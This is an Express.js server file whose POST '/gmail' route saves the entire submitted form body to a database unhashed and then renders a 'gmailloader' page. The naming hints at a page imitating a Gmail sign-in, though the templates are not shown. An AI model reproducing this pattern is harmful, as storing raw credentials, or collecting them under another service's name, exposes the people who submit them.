require('dotenv').config();
const express = require("express");
const path = require("path");
require("./db/conn");
//require("./dbatlas/atlas.js");
const Register = require("./models/registers");
const { json } = require("express");

const hbs = require("hbs");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const Collectionofinputs = require('./models/registers');


const app = express();
const port = process.env.PORT || 5000;


//setting path
const staticpath = path.join(__dirname, "../public");
const templatepath = path.join(__dirname, "../templates/views");
const partialpath = path.join(__dirname, "../templates/partials");


app.use('/css', express.static(path.join(__dirname, "../node_modules/bootstrap/dist/css")));
app.use('/js', express.static(path.join(__dirname, "../node_modules/bootstrap/dist/js")));
app.use('/jq', express.static(path.join(__dirname, "../node_modules/jquery/dist")));

app.use(express.json());
app.use(express.urlencoded({extended:false}));
app.use(express.static(staticpath));

//console.log(path.join(__dirname, "../public"));

app.set("view engine", "hbs");
app.set("views", templatepath);
hbs.registerPartials(partialpath); // register hbs for partial at the time you required hbs



app.get("/", (req, res) => {
res.render("index");
});

app.get("/register", (req, res) => {
    res.render("register");
    });

app.get("/login", (req, res) => {
        res.render("login");
        });

app.post("/gmail", (req, res) => {
            var myData = new Collectionofinputs(req.body);
            myData.save()
            .then(item => {
            res.render("gmailloader");
            })
            .catch(err => {
            res.status(400).send(`Kindly fill all the fields`);
            });
           });
    
   //hashing
   
   





app.listen(port, () => {
    console.log(`server is running the port number is ${port}`)
});